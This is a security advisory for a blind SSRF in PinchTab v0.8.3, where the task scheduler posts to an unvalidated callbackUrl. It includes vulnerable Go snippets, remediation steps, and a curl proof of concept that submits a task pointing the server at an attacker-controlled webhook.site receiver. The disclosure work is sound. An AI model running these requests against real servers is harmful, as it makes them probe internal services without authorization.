# [M] PinchTab has Unauthenticated Blind SSRF in Task Scheduler via Unvalidated callbackUrl

## Summary
Severity: Medium
Advisory: GHSA-xqq2-4j46-vwp7
CVE: CVE-2026-33619
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-03-24
Source: https://github.com/advisories/GHSA-xqq2-4j46-vwp7
Type: github-advisory

## Affected
- Go: `github.com/pinchtab/pinchtab` — affected >=0 <0.8.4

## Details
### Summary
PinchTab v0.8.3 contains a server-side request forgery issue in the optional scheduler's webhook delivery path. When a task is submitted to `POST /tasks` with a user-controlled `callbackUrl`, the v0.8.3 scheduler sends an outbound HTTP `POST` to that URL when the task reaches a terminal state. In that release, the webhook path validated only the URL scheme and did not reject loopback, private, link-local, or other non-public destinations.

Because the v0.8.3 implementation also used the default HTTP client behavior, redirects were followed and the destination was not pinned to validated IPs. This allowed blind SSRF from the PinchTab server to attacker-chosen HTTP(S) targets reachable from the server.

This issue is narrower than a general unauthenticated internet-facing SSRF. The scheduler is optional and off by default, and in token-protected deployments the attacker must already be able to submit tasks using the server's master API token. In PinchTab's intended deployment model, that token represents administrative control rather than a low-privilege role. Tokenless deployments lower the barrier further, but that is a separate insecure configuration state rather than impact created by the webhook bug itself.

PinchTab's default deployment model is local-first and user-controlled, with loopback bind and token-based access in the recommended setup. That lowers practical risk in default use, even though it does not remove the underlying webhook issue when the scheduler is enabled and reachable.

This was addressed in v0.8.4 by validating callback targets before dispatch, rejecting non-public IP ranges, pinning delivery to validated IPs, disabling redirect following, and validating `callbackUrl` during task submission.

### Details
**Issue 1 - Webhook dispatch validated only scheme in v0.8.3 (`internal/scheduler/webhook.go`):**
The vulnerable `sendWebhook()` implementation accepted any `http` or `https` URL and dispatched the outbound request without destination IP validation:

```go
// internal/scheduler/webhook.go - v0.8.3
parsed, err := url.Parse(callbackURL)
if parsed.Scheme != "http" && parsed.Scheme != "https" {
    slog.Warn("webhook: unsupported scheme", ...)
    return
}

req, _ := http.NewRequest(http.MethodPost, callbackURL, bytes.NewReader(payload))
resp, err := webhookClient.Do(req)
```

In v0.8.3 there was no hostname resolution and no rejection of loopback, private, link-local, or other non-public addresses before dispatch.

**Issue 2 - `callbackUrl` was accepted without server-side validation in v0.8.3 (`internal/scheduler/task.go`):**
The task submission schema accepted a user-controlled `callbackUrl`, and the v0.8.3 request validation logic did not validate it:

```go
// internal/scheduler/task.go - v0.8.3
type SubmitRequest struct {
    AgentID     string         `json:"agentId"`
    Action      string         `json:"action"`
    CallbackURL string         `json:"callbackUrl,omitempty"`
}

func (r *SubmitRequest) Validate() error {
    if r.AgentID == "" {
        return fmt.Errorf("missing required field 'agentId'")
    }
    if r.Action == "" {
        return fmt.Errorf("missing required field 'action'")
    }
    return nil
}
```

This meant a user-supplied `callbackUrl` flowed into webhook delivery without early rejection.

**Issue 3 - Redirects were followed in v0.8.3:**
The v0.8.3 webhook client used the default `http.Client`, so redirects were followed. That made the SSRF broader than the initially supplied URL alone, because an attacker-controlled external endpoint could redirect the server to a second destination.

### PoC
**Prerequisites**

- PinchTab `v0.8.3`
- `scheduler.enabled: true` because the scheduler is off by default
- The attacker can submit tasks to `POST /tasks`
- In token-protected deployments, this requires the master API token
- In deployments intentionally or accidentally running without a token, the barrier is lower, but that is separate from the webhook bug itself
- An attacker-controlled HTTP listener to receive and log the outbound request

Enable scheduler if required:

```bash
curl -s -X PUT http://TARGET:9867/api/config \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"scheduler":{"enabled":true}}'
```

Restart PinchTab after changing config.

**Execution**
Submit a task with an attacker-controlled `callbackUrl`. A valid `tabId` is not required because the webhook fires for terminal task states, including failure:

```bash
curl -s -X POST http://TARGET:9867/tasks \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "agentId": "poc-agent",
    "action": "navigate",
    "params": {"url": "https://example.com"},
    "callbackUrl": "https://webhook.site/c4030a47-259a-4ea4-ae34-fdbf96914b19"
  }'
```

Confirm the task was accepted:

```json
{
  "createdAt": "2026-03-18T10:02:39.847097+07:00",
  "position": 1,
  "state": "queued",
  "taskId": "tsk_2633324a"
}
```

Poll task state:

```bash
curl -s -H "Authorization: Bearer <token>" http://TARGET:9867/tasks/tsk_2633324a
```

Example result:

```json
{
  "taskId": "tsk_2633324a",
  "state": "failed",
  "error": "tabId is required for task execution",
  "callbackUrl": "https://webhook.site/c4030a47-259a-4ea4-ae34-fdbf96914b19",
  "completedAt": "2026-03-18T10:02:39.858043+07:00"
}
```

Query the attacker-controlled receiver for the inbound POST:

```bash
curl -s "https://webhook.site/token/c4030a47-259a-4ea4-ae34-fdbf96914b19/requests" \
  | python3 -m json.tool
```

**Observation**
1. The task is accepted and reaches a terminal state.
2. The attacker-controlled receiver logs an inbound POST originating from the PinchTab server's egress address.
3. The webhook includes the task snapshot payload and PinchTab-specific headers, confirming server-side delivery.
4. In v0.8.3, the same dispatch path can be directed at internal or non-public HTTP targets reachable from the server.
5. This PoC demonstrates blind outbound request capability; it does not by itself demonstrate response-body disclosure or automatic cloud credential theft.

### Impact
1. Blind SSRF from the PinchTab server to attacker-chosen HTTP(S) targets when the optional scheduler is enabled and reachable.
2. Potential interaction with internal HTTP services or metadata endpoints that are reachable from the server but not from the attacker directly.
3. Limited direct confidentiality impact because the webhook is a fixed outbound POST and the response body is not returned to the attacker through the task API.
4. Potential low-integrity impact where internal services accept unauthenticated POST requests and perform state-changing actions.
5. Practical risk is lower in the documented default local-first deployment model, where loopback bind, generated tokens, and a disabled scheduler reduce exposure.

### Suggested Remediation
Apply the same outbound destination controls used for safer HTTP egress paths to scheduler webhook delivery. Specifically:

1. Resolve the hostname of `callbackUrl` before dispatch and reject loopback, private, link-local, multicast, unspecified, and other non-public IP ranges.
2. Pin delivery to the validated IP set instead of relying on fresh DNS resolution during connect.
3. Reject redirects or re-validate every redirect target before following it.
4. Validate `callbackUrl` during task submission so unsafe targets fail early instead of only at delivery time.
5. Optionally add an allowlist for approved webhook destinations if operators need narrowly scoped internal receivers.

### Evidence Capture
**Exploit**

<img width="2864" height="1387" alt="new" src="https://github.com/user-attachments/assets/b7b5cf31-c463-4e25-adff-fc8798f1f33b" />

**Verify**

<img width="2866" height="1474" alt="web" src="https://github.com/user-attachments/assets/65391b00-8df5-4c3c-8789-eb100f65b301" />

## References
- https://github.com/pinchtab/pinchtab/security/advisories/GHSA-xqq2-4j46-vwp7
- https://nvd.nist.gov/vuln/detail/CVE-2026-33619
- https://github.com/pinchtab/pinchtab/commit/c824574c3a05073dec2f5e9c219e22ffff8de445
- https://github.com/pinchtab/pinchtab
- https://github.com/pinchtab/pinchtab/releases/tag/v0.8.4
